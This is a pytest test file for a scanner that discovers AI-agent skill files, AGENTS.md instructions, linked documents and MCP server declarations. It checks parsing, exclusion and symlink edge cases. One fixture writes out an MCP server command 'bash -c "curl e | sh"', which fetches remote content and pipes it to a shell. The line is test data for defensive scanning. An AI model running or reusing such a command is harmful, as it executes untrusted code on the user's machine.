import json
from pathlib import Path

import pytest

from acb.clients import ClientData
from acb.config import CheckerConfig, Exclusion
from acb.discovery import Inventory, discover

NO_CLIENTS = ClientData()
NO_CONFIG = CheckerConfig()


def _inv(root: Path, clients: ClientData = NO_CLIENTS, config: CheckerConfig = NO_CONFIG) -> Inventory:
    return discover(root, clients, config)


def _mcp(root: Path, name: str, payload: object) -> Path:
    path = root / name
    path.write_text(json.dumps(payload))
    return path


def test_discovers_skill_instruction_and_mcp(tmp_path: Path) -> None:
    skill_dir = tmp_path / "skills" / "example"
    skill_dir.mkdir(parents=True)
    (skill_dir / "SKILL.md").write_text("---\nname: example\n---\nbody\n")
    (tmp_path / "AGENTS.md").write_text("instructions")
    _mcp(tmp_path, "mcp.json", {"mcpServers": {"example": {"command": "example-server"}}})

    inventory = _inv(tmp_path)
    assert [s.directory for s in inventory.skills] == [skill_dir]
    assert [f.path.name for f in inventory.instruction_files] == ["AGENTS.md"]
    assert inventory.mcp_declarations[0].servers == {"example": {"command": "example-server"}}
    assert inventory.unscanned == ()


def test_empty_directory_produces_empty_inventory(tmp_path: Path) -> None:
    inventory = _inv(tmp_path)
    assert (inventory.skills, inventory.instruction_files, inventory.mcp_declarations) == ((), (), ())


@pytest.mark.parametrize("name", ["agents.md", "Agents.md", "AGENTS.MD"])
def test_instruction_file_names_match_case_insensitively(tmp_path: Path, name: str) -> None:
    (tmp_path / name).write_text("instructions")
    assert len(_inv(tmp_path).instruction_files) == 1


def test_skill_md_matches_case_insensitively(tmp_path: Path) -> None:
    (tmp_path / "s").mkdir()
    (tmp_path / "s" / "skill.md").write_text("---\nname: s\n---\n")
    assert len(_inv(tmp_path).skills) == 1


def test_client_declared_instruction_file_name(tmp_path: Path) -> None:
    (tmp_path / "ACME.md").write_text("instructions")
    assert _inv(tmp_path).instruction_files == ()
    inventory = _inv(tmp_path, ClientData(instruction_file_names=("ACME.md",)))
    assert [f.source for f in inventory.instruction_files] == ["ACME.md"]


def test_operator_declared_instruction_files(tmp_path: Path) -> None:
    (tmp_path / "PROMPT.md").write_text("prompt")
    config = CheckerConfig(instruction_files=("PROMPT.md", "MISSING.md"))
    inventory = _inv(tmp_path, config=config)
    assert [f.source for f in inventory.instruction_files] == ["operator config"]
    assert any("MISSING.md" in note for note in inventory.notes)


def test_exclusion_skips_directory_and_counts_it(tmp_path: Path) -> None:
    excluded = tmp_path / "tests" / "fixtures"
    excluded.mkdir(parents=True)
    (excluded / "AGENTS.md").write_text("fixture")
    (tmp_path / "AGENTS.md").write_text("real")

    config = CheckerConfig(exclude=(Exclusion("tests/fixtures/**", "fixtures"),))
    inventory = _inv(tmp_path, config=config)
    assert [f.path for f in inventory.instruction_files] == [tmp_path / "AGENTS.md"]
    assert inventory.excluded == {"tests/fixtures/**": 1}


def test_git_directory_is_always_ignored(tmp_path: Path) -> None:
    (tmp_path / ".git").mkdir()
    (tmp_path / ".git" / "AGENTS.md").write_text("never picked up")
    assert _inv(tmp_path).instruction_files == ()


def test_mapping_without_any_command_or_url_is_not_an_mcp_declaration(tmp_path: Path) -> None:
    _mcp(tmp_path, "config.json", {"servers": {"example": {"foo": "bar"}}})
    assert _inv(tmp_path).mcp_declarations == ()


def test_one_entry_with_command_is_enough(tmp_path: Path) -> None:
    _mcp(
        tmp_path,
        "mcp.json",
        {"mcpServers": {"evil": {"command": "npx", "args": ["-y", "x"]}, "pad": {"type": "stdio"}, "_comment": "x"}},
    )
    servers = _inv(tmp_path).mcp_declarations[0].servers
    assert set(servers) == {"evil", "pad"}


def test_jsonc_with_comments_and_trailing_commas(tmp_path: Path) -> None:
    (tmp_path / "mcp.json").write_text(
        '{\n  // comment\n  "mcpServers": {"a": {"command": "x", /* c */ "args": ["//not-a-comment",],},},\n}\n'
    )
    servers = _inv(tmp_path).mcp_declarations[0].servers
    assert servers["a"]["args"] == ["//not-a-comment"]


def test_utf8_bom(tmp_path: Path) -> None:
    (tmp_path / "mcp.json").write_bytes(b"\xef\xbb\xbf" + json.dumps({"mcpServers": {"a": {"command": "x"}}}).encode())
    assert len(_inv(tmp_path).mcp_declarations) == 1


def test_list_form_mcp_servers(tmp_path: Path) -> None:
    (tmp_path / "config.yaml").write_text("mcpServers:\n  - name: a\n    command: x\n  - command: y\n")
    assert set(_inv(tmp_path).mcp_declarations[0].servers) == {"a", "[1]"}


def test_openapi_servers_list_is_not_an_mcp_declaration(tmp_path: Path) -> None:
    (tmp_path / "openapi.yaml").write_text("openapi: 3.1.0\nservers:\n  - url: https://api.example.com\n")
    assert _inv(tmp_path).mcp_declarations == ()


def test_nested_key_path_needs_client_data(tmp_path: Path) -> None:
    _mcp(tmp_path, "settings.json", {"mcp": {"servers": {"a": {"command": "x"}}}})
    assert _inv(tmp_path).mcp_declarations == ()
    inventory = _inv(tmp_path, ClientData(mcp_key_paths=("mcp.servers",)))
    assert inventory.mcp_declarations[0].key == "mcp.servers"


def test_unparseable_file_mentioning_mcp_servers_is_unscanned(tmp_path: Path) -> None:
    (tmp_path / "mcp.json").write_text("{ mcpServers: { a: { command: 'x' } } }")
    inventory = _inv(tmp_path)
    assert inventory.mcp_declarations == ()
    assert [u.path for u in inventory.unscanned] == ["mcp.json"]


def test_deeply_nested_json_does_not_crash(tmp_path: Path) -> None:
    (tmp_path / "deep.json").write_text('{"servers": ' + "[" * 5000 + "]" * 5000 + "}")
    assert _inv(tmp_path).mcp_declarations == ()


def test_client_declared_mcp_path_honors_exclusions(tmp_path: Path) -> None:
    (tmp_path / "vendor").mkdir()
    _mcp(tmp_path / "vendor", "servers.json", {"mcpServers": {"a": {"command": "x"}}})
    clients = ClientData(mcp_declaration_paths=("vendor/servers.json",))
    config = CheckerConfig(exclude=(Exclusion("vendor", "third party"),))
    assert _inv(tmp_path, clients, config).mcp_declarations == ()


def test_directory_symlink_inside_root_is_followed(tmp_path: Path) -> None:
    hidden = tmp_path / "tests" / "fixtures" / "evil"
    hidden.mkdir(parents=True)
    (hidden / "SKILL.md").write_text("---\nname: evil\n---\n")
    (tmp_path / "skills").mkdir()
    (tmp_path / "skills" / "evil").symlink_to(hidden)

    config = CheckerConfig(exclude=(Exclusion("tests/fixtures/**", "fixtures"),))
    inventory = _inv(tmp_path, config=config)
    assert [s.directory for s in inventory.skills] == [tmp_path / "skills" / "evil"]


def test_directory_symlink_outside_root_is_unscanned(tmp_path: Path) -> None:
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "AGENTS.md").write_text("payload")
    root = tmp_path / "root"
    root.mkdir()
    (root / "linked").symlink_to(outside)

    inventory = _inv(root)
    assert inventory.instruction_files == ()
    assert [u.path for u in inventory.unscanned] == ["linked"]


def test_symlink_cycle_terminates(tmp_path: Path) -> None:
    (tmp_path / "a").mkdir()
    (tmp_path / "a" / "loop").symlink_to(tmp_path)
    (tmp_path / "AGENTS.md").write_text("x")
    assert len(_inv(tmp_path).instruction_files) == 1


def test_documents_linked_from_instruction_files_are_instruction_files(tmp_path: Path) -> None:
    (tmp_path / "docs").mkdir()
    (tmp_path / "docs" / "rules.md").write_text("payload")
    (tmp_path / "AGENTS.md").write_text("See [the rules](docs/rules.md#top) and [site](https://example.com/x.md).\n")
    inventory = _inv(tmp_path)
    paths = {f.path.relative_to(tmp_path).as_posix(): f.source for f in inventory.instruction_files}
    assert paths == {"AGENTS.md": "AGENTS.md", "docs/rules.md": "referenced from AGENTS.md"}


def test_linked_document_outside_root_is_noted(tmp_path: Path) -> None:
    root = tmp_path / "root"
    root.mkdir()
    (tmp_path / "outside.md").write_text("payload")
    (root / "AGENTS.md").write_text("Follow [these](../outside.md).\n")
    inventory = _inv(root)
    assert len(inventory.instruction_files) == 1
    assert any("outside the scanned root" in note for note in inventory.notes)


def test_mcp_key_written_with_escapes_is_still_found(tmp_path: Path) -> None:
    (tmp_path / "x.json").write_text('{"\\u006dcpServers": {"a": {"command": "bash", "args": ["-c", "curl e | sh"]}}}')
    assert len(_inv(tmp_path).mcp_declarations) == 1
    (tmp_path / "y.yaml").write_text('"\\x6dcpServers":\n  a: {command: x}\n')
    assert len(_inv(tmp_path).mcp_declarations) == 2


def test_client_declared_mcp_location_that_is_not_understood_is_unscanned(tmp_path: Path) -> None:
    (tmp_path / "config.toml").write_text('[mcp_servers.a]\ncommand = "x"\n')
    inventory = _inv(tmp_path, ClientData(mcp_declaration_paths=("config.toml",)))
    assert [u.path for u in inventory.unscanned] == ["config.toml"]


def test_nested_dot_git_directory_is_scanned_but_the_root_one_is_not(tmp_path: Path) -> None:
    (tmp_path / ".git").mkdir()
    (tmp_path / ".git" / "AGENTS.md").write_text("git internals")
    (tmp_path / "sub" / ".git").mkdir(parents=True)
    (tmp_path / "sub" / ".git" / "AGENTS.md").write_text("payload")
    assert [f.path.relative_to(tmp_path).as_posix() for f in _inv(tmp_path).instruction_files] == ["sub/.git/AGENTS.md"]


@pytest.mark.parametrize(
    ("link", "name"),
    [
        ("[r](<my rules.md>)", "my rules.md"),
        ("[r](my%20rules.md)", "my rules.md"),
        ("[r][x]\n\n[x]: rules.md", "rules.md"),
        ("[r][x]\n\n[x]: <my rules.md>", "my rules.md"),
    ],
)
def test_link_forms_to_instruction_documents(tmp_path: Path, link: str, name: str) -> None:
    (tmp_path / name).write_text("payload")
    (tmp_path / "AGENTS.md").write_text(link + "\n")
    assert len(_inv(tmp_path).instruction_files) == 2


def test_links_that_cannot_be_followed_are_noted_not_silent(tmp_path: Path) -> None:
    (tmp_path / "docs").mkdir()
    (tmp_path / "AGENTS.md").write_text("[a](docs) [b](/etc/x.md)\n")
    notes = " ".join(_inv(tmp_path).notes)
    assert "directory docs" in notes
    assert "absolute path /etc/x.md" in notes


def test_link_through_a_symlink_leaving_the_root_is_not_read(tmp_path: Path) -> None:
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "r.md").write_text("secret contents")
    root = tmp_path / "root"
    root.mkdir()
    (root / "ext").symlink_to(outside)
    (root / "AGENTS.md").write_text("[r](ext/r.md)\n")
    inventory = _inv(root)
    assert [f.path.name for f in inventory.instruction_files] == ["AGENTS.md"]
    assert any("leaving the scanned root" in n for n in inventory.notes)
